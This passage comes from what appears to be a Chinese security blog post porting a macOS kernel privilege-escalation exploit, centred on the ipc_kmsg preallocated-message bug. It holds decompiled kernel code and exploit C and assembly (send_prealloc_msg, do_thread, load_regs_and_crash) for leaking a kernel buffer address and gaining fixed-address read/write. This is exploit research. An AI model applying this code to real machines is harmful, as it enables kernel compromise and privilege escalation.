MACH_MSG_TRAILER_FORMAT_0;</span></div><div class="line">    *(_DWORD *)(v22 + a2 + <span class="number">4</span>) = <span class="number">8</span>;              <span class="comment">// trailer-&gt;msgh_trailer_size = MACH_MSG_TRAILER_MINIMUM_SIZE;</span></div><div class="line">    *(_DWORD *)(v22 + a2 + <span class="number">64</span>) = <span class="number">0</span>;             <span class="comment">// trailer-&gt;msgh_labels.sender = 0;</span></div><div class="line">    *v24 = (<span class="keyword">void</span> **)v6;                         <span class="comment">// *kmsgp = kmsg;</span></div><div class="line">    <span class="keyword">return</span> <span class="number">0L</span>L;</div><div class="line">  &#125;</div><div class="line">  v23 = (_QWORD *)(v4 + <span class="number">8</span>);</div><div class="line">  usimple_lock(v4 + <span class="number">8</span>);</div><div class="line">  <span class="keyword">if</span> ( *(_DWORD *)v4 &lt; <span class="number">0</span> )</div><div class="line">  &#123;</div><div class="line">    v24 = v3;</div><div class="line">    v6 = *(<span class="keyword">unsigned</span> <span class="keyword">int</span> **)(v4 + <span class="number">0x88</span>);         <span class="comment">// kmsg = dest_port-&gt;ip_premsg;</span></div><div class="line">    <span class="keyword">if</span> ( *((_QWORD *)v6 + <span class="number">4</span>) )</div><div class="line">    &#123;</div><div class="line">      *v23 = <span class="number">0L</span>L;</div><div class="line">      v11 = __readgsdword(<span class="number">0x18</span>u) - <span class="number">1</span>;</div><div class="line">      __writegsdword(<span class="number">0x18</span>u, v11);</div><div class="line">      result = <span class="number">0x1000000D</span>LL;</div><div class="line">      <span class="keyword">if</span> ( !v11 )</div><div class="line">      &#123;</div><div class="line">        v12 = __readeflags();</div><div class="line">        v13 = __readgsqword(<span class="number">0</span>);</div><div class="line">        <span class="keyword">if</span> ( v12 &amp; <span class="number">0x200</span> )</div><div class="line">        &#123;</div><div class="line">          <span class="keyword">if</span> ( *(_DWORD *)(v13 + <span class="number">0x58</span>) &amp; <span class="number">4</span> )</div><div class="line">            __asm &#123; <span class="keyword">int</span>     <span class="number">0F</span>Fh; AT/XT286/PS50+ - destroyed by <span class="keyword">return</span> from <span class="keyword">protected</span> mode &#125;</div><div class="line">        &#125;</div><div class="line">      &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span></div><div class="line">    &#123;</div><div class="line">      <span class="keyword">if</span> ( v5 &lt;= *v6 )                          <span class="comment">// if (msg_and_trailer_size &gt; kmsg-&gt;ikm_size - max_desc) </span></div><div class="line">      &#123;</div><div class="line">        *((_QWORD *)v6 + <span class="number">4</span>) = v4;               <span class="comment">// kmsg-&gt;ikm_prealloc</span></div><div class="line">        v17 = (<span class="keyword">volatile</span> <span class="keyword">signed</span> __int32 *)(v4 + <span class="number">4</span>);</div><div class="line">        <span class="keyword">do</span></div><div class="line">        &#123;</div><div class="line">          <span class="keyword">if</span> ( *v17 == <span class="number">0x7FFFFFFF</span> )</div><div class="line">            <span class="keyword">break</span>;</div><div class="line">          v18 = *v17;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">while</span> ( v18 != _InterlockedCompareExchange(v17, v18 + <span class="number">1</span>, v18) );</div><div class="line">        *((_QWORD *)v6 + <span class="number">3</span>) = (<span class="keyword">char</span> *)v6 + *v6 - v5 + <span class="number">0x50</span>;<span class="comment">// kmsg-&gt;ikm_header</span></div><div class="line">        *v23 = <span class="number">0L</span>L;</div><div class="line">        v19 = __readgsdword(<span class="number">0x18</span>u) - <span class="number">1</span>;</div><div class="line">        __writegsdword(<span class="number">0x18</span>u, v19);</div><div class="line">        <span class="keyword">if</span> ( !v19 )</div><div class="line">        &#123;</div><div class="line">          v20 = __readeflags();</div><div class="line">          v21 = __readgsqword(<span class="number">0</span>);</div><div class="line">          <span class="keyword">if</span> ( v20 &amp; <span class="number">0x200</span> )</div><div class="line">          &#123;</div><div class="line">            <span class="keyword">if</span> ( *(_DWORD *)(v21 + <span class="number">0x58</span>) &amp; <span class="number">4</span> )</div><div class="line">              __asm &#123; <span class="keyword">int</span>     <span class="number">0F</span>Fh; AT/XT286/PS50+ - destroyed by <span class="keyword">return</span> from <span class="keyword">protected</span> mode &#125;</div><div class="line">          &#125;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">goto</span> LABEL_27;                          <span class="comment">// 回到结尾部分，并返回MACH_MSG_SUCCESS(0LL)</span></div><div class="line">      &#125;</div><div class="line">      *v23 = <span class="number">0L</span>L;</div><div class="line">      v14 = __readgsdword(<span class="number">0x18</span>u) - <span class="number">1</span>;</div><div class="line">      __writegsdword(<span class="number">0x18</span>u, v14);</div><div class="line">      result = <span class="number">0x1000000E</span>LL;                    <span class="comment">// MACH_SEND_TOO_LARGE </span></div><div class="line">      <span class="keyword">if</span> ( !v14 )</div><div class="line">      &#123;</div><div class="line">        v15 = __readeflags();</div><div class="line">        v16 = __readgsqword(<span class="number">0</span>);</div><div class="line">        <span class="keyword">if</span> ( v15 &amp; <span class="number">0x200</span> )</div><div class="line">        &#123;</div><div class="line">          <span class="keyword">if</span> ( *(_DWORD *)(v16 + <span class="number">0x58</span>) &amp; <span class="number">4</span> )</div><div class="line">            __asm &#123; <span class="keyword">int</span>     <span class="number">0F</span>Fh; AT/XT286/PS50+ - destroyed by <span class="keyword">return</span> from <span class="keyword">protected</span> mode &#125;</div><div class="line">        &#125;</div><div class="line">      &#125;</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">else</span></div><div class="line">  &#123;</div><div class="line">    *v23 = <span class="number">0L</span>L;</div><div class="line">    v8 = __readgsdword(<span class="number">0x18</span>u) - <span class="number">1</span>;</div><div class="line">    __writegsdword(<span class="number">0x18</span>u, v8);</div><div class="line">    result = <span class="number">0x1000000D</span>LL;</div><div class="line">    <span class="keyword">if</span> ( !v8 )</div><div class="line">    &#123;</div><div class="line">      v9 = __readeflags();</div><div class="line">      v10 = __readgsqword(<span class="number">0</span>);</div><div class="line">      <span class="keyword">if</span> ( v9 &amp; <span class="number">0x200</span> )</div><div class="line">      &#123;</div><div class="line">        <span class="keyword">if</span> ( *(_DWORD *)(v10 + <span class="number">88</span>) &amp; <span class="number">4</span> )</div><div class="line">          __asm &#123; <span class="keyword">int</span>     <span class="number">0F</span>Fh; AT/XT286/PS50+ - destroyed by <span class="keyword">return</span> from <span class="keyword">protected</span> mode &#125;</div><div class="line">      &#125;</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">return</span> result;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>单纯从IDA的角度我们可以算出<code>ikm_header</code>的位置，但并不知道异常消息在距离<code>header</code>多少的位置，我选择通过<code>lldb</code>来调试，调试内核需要下载对应版本的<code>KDK</code>，到官网下载即可，注意配置的时候按照本地本应版本目录下的说明文档进行配置，连接之前在客户机上要先触发<code>NMI</code>中断，还有一个需要注意的点就是如果我们直接去断<code>ipc_kmsg_get_from_kernel</code>是断不下来的，因为调用太多，所以我们需要通过上层引用来找到真正触发异常的是哪个，通过阅读源码我们找到这个函数，并将整个关系画了个图梳理一下：</p>
+<p><img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-08-09%20%E4%B8%8B%E5%8D%883.09.37.png" alt="异常内核调用"></p>
+<p>下面我们来看看<code>ipc_kmsg</code>的消息队列代码：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">ipc_kmsg_enqueue</span><span class="params">(<span class="keyword">ipc_kmsg_queue_t</span> <span class="built_in">queue</span>，</span></span></div><div class="line">                      <span class="keyword">ipc_kmsg_t</span> kmsg)</div><div class="line">&#123;</div><div class="line">  <span class="keyword">ipc_kmsg_t</span> first = <span class="built_in">queue</span>-&gt; ikmq_base;</div><div class="line">  <span class="keyword">ipc_kmsg_t</span> last;</div><div class="line"></div><div class="line">  <span class="keyword">if</span>(first == IKM_NULL)&#123;</div><div class="line">    <span class="built_in">queue</span>-&gt; ikmq_base = kmsg;</div><div class="line">    kmsg-&gt; ikm_next = kmsg;</div><div class="line">    kmsg-&gt; ikm_prev = kmsg;</div><div class="line">  &#125; <span class="keyword">else</span> &#123;</div><div class="line">    last = first-&gt; ikm_prev;</div><div class="line">    kmsg-&gt; ikm_next = first;</div><div class="line">    kmsg-&gt; ikm_prev = last;</div><div class="line">    first-&gt; ikm_prev = kmsg;</div><div class="line">    last-&gt; ikm_next = kmsg;</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>从代码中我们可以看到如果消息队列中没有消息的话，就会导致<code>kmsg</code>的<code>ikm_next</code>字段指向的是本身，否则指向的就是第一条消息，这是我们利用的关键之处，下面的操作就会是我们读取到第二个<code>port</code>的<code>ipc_kmsg</code>缓冲区的地址：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">uint64_t</span> valid_header [] = &#123;<span class="number">0xc40</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>&#125;;</div><div class="line">send_prealloc_msg（first_port，valid_header，<span class="number">8</span>）;</div><div class="line">  </div><div class="line"><span class="comment">//向第二个端口发送消息</span></div><div class="line"><span class="comment">//在prealloc缓冲区中写一个指向自身的指针</span></div><div class="line">send_prealloc_msg(second_port，valid_header，<span class="number">8</span>);</div><div class="line">  </div><div class="line"><span class="comment">//在第一个端口上接收，读取第二个端口：</span></div><div class="line"><span class="keyword">uint64_t</span> * buf = receive_prealloc_msg(first_port);</div><div class="line">  </div><div class="line"><span class="comment">//这是第二个端口的地址</span></div><div class="line">kernel_buffer_base = buf [<span class="number">1</span>];</div></pre></td></tr></table></figure>
+<p>看到这里会有点迷糊，为什么这样就是固定地址读写了呢，那么就来看看<code>send_prealloc_msg</code>的实现：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">send_prealloc_msg</span><span class="params">(<span class="keyword">mach_port_t</span> port,<span class="keyword">uint64_t</span> * buf,<span class="keyword">int</span> n)</span></span>&#123;</div><div class="line">  <span class="keyword">struct</span> thread_args * args = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> thread_args));</div><div class="line">  <span class="built_in">memset</span>(args,<span class="number">0</span>,<span class="keyword">sizeof</span>(<span class="keyword">struct</span> thread_args));</div><div class="line">  <span class="built_in">memcpy</span>(args-&gt;buf,buf,n * <span class="number">8</span>);</div><div class="line">  </div><div class="line">  args-&gt;exception_port = port;</div><div class="line">  </div><div class="line">  <span class="comment">//启动一个新线程，将缓冲区和异常端口传递给它</span></div><div class="line">  <span class="keyword">pthread_t</span> t;</div><div class="line">  pthread_create((＆t,<span class="literal">NULL</span>,do_thread,(<span class="keyword">void</span> *)args);</div><div class="line">  </div><div class="line">  <span class="comment">//将pthread_t与端口关联 </span></div><div class="line">  <span class="comment">//这样我们就可以加入正确的pthread</span></div><div class="line">  <span class="comment">//当我们收到异常消息并退出</span></div><div class="line">  <span class="keyword">kern_return_t</span> err = mach_port_set_context(mach_task_self(),</div><div class="line">                                            port,</div><div class="line">                                            (<span class="keyword">mach_port_context_t</span>)t);</div><div class="line"></div><div class="line">  <span class="comment">//等到消息实际发送完毕：</span></div><div class="line">  <span class="keyword">while</span>(!port_has_message(port))&#123;;&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>请记住，要将受控数据导入端口的预分配<code>ipc_kmsg</code>，我们需要内核向其发送异常消息，因此<code>send_prealloc_msg</code>实际上是导致异常的产生。它分配一个<code>struct thread_args</code> ，这个结构体包含了我们在消息中所需的受控制的数据的副本和目标端口，然后它将启动一个新的线程，并调用do_thread ：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">void</span> * <span class="title">do_thread</span><span class="params">(<span class="keyword">void</span> * arg)</span></span>&#123;</div><div class="line">  <span class="keyword">struct</span> thread_args * args =(<span class="keyword">struct</span> thread_args *)arg;</div><div class="line">  <span class="keyword">uint64_t</span> buf [<span class="number">32</span>];</div><div class="line">  <span class="built_in">memcpy</span>(buf, args-&gt;buf, <span class="keyword">sizeof</span>(buf));</div><div class="line">  </div><div class="line">  <span class="keyword">kern_return_t</span> err;</div><div class="line">  err = thread_set_exception_ports(mach_thread_self()，</div><div class="line">                                   EXC_MASK_ALL,</div><div class="line">                                   args-&gt;exception_port,</div><div class="line">                                   EXCEPTION_STATE,</div><div class="line">                                   x86_THREAD_STATE64);</div><div class="line">  <span class="built_in">free</span>(args);</div><div class="line">  load_regs_and_crash(buf);</div><div class="line">  <span class="keyword">return</span> <span class="literal">NULL</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>do_thread 将受控数据从thread_args 结构复制到本地缓冲区，然后将目标端口设置为此线程的异常处理程序。它释放<code>args</code>，然后调用<code>load_regs_and_crash</code>，它将缓冲区复制到<code>x86</code>通用寄存器中并触发软件断点:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">.text</div><div class="line">.global _load_regs_and_crash</div><div class="line">.align 2</div><div class="line">_load_regs_and_crash</div><div class="line">mov %rdi, %r13</div><div class="line">mov (%r13), %rax</div><div class="line">mov 0x8(%r13), %rbx</div><div class="line">mov 0x10(%r13), %rcx</div><div class="line">mov 0x18(%r13), %rdx</div><div class="line">mov 0x20(%r13), %r8</div><div class="line">mov 0x28(%r13), %r9</div><div class="line">int3</div><div class="line">.align 3</div></pre></td></tr></table></figure>
+<p>这个<code>load_regs_and_crash</code>是我们根据平台自己写的汇编代码(AT&amp;T)，目的是为了将参数后面的连续空间都放进寄存器，然后内核的中断处理程序将调用<code>exception_deliver</code> ，它将查找线程的异常端口并调用<code>MIG</code> <code>mach_exception_raise_state</code>方法，该方法将崩溃线程的寄存器状态序列化为<code>MIG</code>消息并调用<code>mach_msg_rpc_from_kernel_body</code> ，它将获取异常端口的预分配<code>ipc_kmsg</code> ，信任ikm_size 字段并将消息和缓冲区末尾对齐：</p>
+<p><img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-08-02%20%E4%B8%8A%E5%8D%8811.19.15.png" alt="第二次溢出"></p>
+<p>如果我们只是发送消息，并立刻接受消息，那么读取到的就只是我们刚刚写的内容，为了读取到别的东西，我们又向第二个端口发送了消息，这样<code>ikm_msg</code>的<code>ikm_next</code>字段就会指向<code>message buffer</code>了，然后我们再接受消息，读取到的<code>ikm_next</code>字段就不是原来的数据，而是<code>second_kmsg</code>的第一条消息了！</p>
+
+  </div>
+</article>
+
+
+
+      </div>
+      
+       <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="https://github.com/Peterpan0927">Github</a></li>
+         
+          <li><a href="https://weibo.com/p/1005055999539768?is_all=1">Weibo</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x00-前言"><span class="toc-number">1.</span> <span class="toc-text">0x00.前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-ipc-kmsg"><span class="toc-number">2.</span> <span class="toc-text">0x01.ipc_kmsg</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-控制数据"><span class="toc-number">3.</span> <span class="toc-text">0x01.控制数据</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-固定地址读写"><span class="toc-number">4.</span> <span class="toc-text">0x02.固定地址读写</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://peterpan980927.cn/2018/08/06/绕过SMAP提权-Mac移植/"><i class="fa fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://peterpan980927.cn/2018/08/06/绕过SMAP提权-Mac移植/&text=绕过SMAP提权(Mac移植)"><i class="fa fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://peterpan980927.cn/2018/08/06/绕过SMAP提权-Mac移植/&title=绕过SMAP提权(Mac移植)"><i class="fa fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://peterpan980927.cn/2018/08/06/绕过SMAP提权-Mac移植/&is_video=false&description=绕过SMAP提权(Mac移植)"><i class="fa fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=绕过SMAP提权(Mac移植)&body=Check out this article: https://peterpan980927.cn/2018/08/06/绕过SMAP提权-Mac移植/"><i class="fa fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://peterpan980927.cn/2018/08/06/绕过SMAP提权-Mac移植/&title=绕过SMAP提权(Mac移植)"><i class="fa fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://peterpan980927.cn/2018/08/06/绕过SMAP提权-Mac移植/&title=绕过SMAP提权(Mac移植)"><i class="fa fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://peterpan980927.cn/2018/08/06/绕过SMAP提权-Mac移植/&title=绕过SMAP提权(Mac移植)"><i class="fa fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://peterpan980927.cn/2018/08/06/绕过SMAP提权-Mac移植/&title=绕过SMAP提权(Mac移植)"><i class="fa fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://peterpan980927.cn/2018/08/06/绕过SMAP提权-Mac移植/&name=绕过SMAP提权(Mac移植)&description="><i class="fa fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+      <ul>
+        <li id="toc"><a class="icon" href="#" onclick='$("#toc-footer").toggle();return false;'><i class="fa fa-list fa-lg" aria-hidden="true"></i> TOC</a></li>
+        <li id="share"><a class="icon" href="#" onclick='$("#share-footer").toggle();return false;'><i class="fa fa-share-alt fa-lg" aria-hidden="true"></i> Share</a></li>
+        <li id="top" style="display:none"><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a></li>
+        <li id="menu"><a class="icon" href="#" onclick='$("#nav-footer").toggle();return false;'><i class="fa fa-bars fa-lg" aria-hidden="true"></i> Menu</a></li>
+      </ul>
+    </div>
+
+  </div>
+</div>
+
+      
+      <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2018 Peter pan
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="https://github.com/Peterpan0927">Github</a></li>
+         
+          <li><a href="https://weibo.com/p/1005055999539768?is_all=1">Weibo</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+      <script src="/lib/justified-gallery/jquery.justifiedGallery.min.js"></script>
+<script src="/js/main.js"></script>
+<!-- Google Analytics -->
+
+<!-- Disqus Comments -->
+
+
+    </div>
+</body>
+</html>
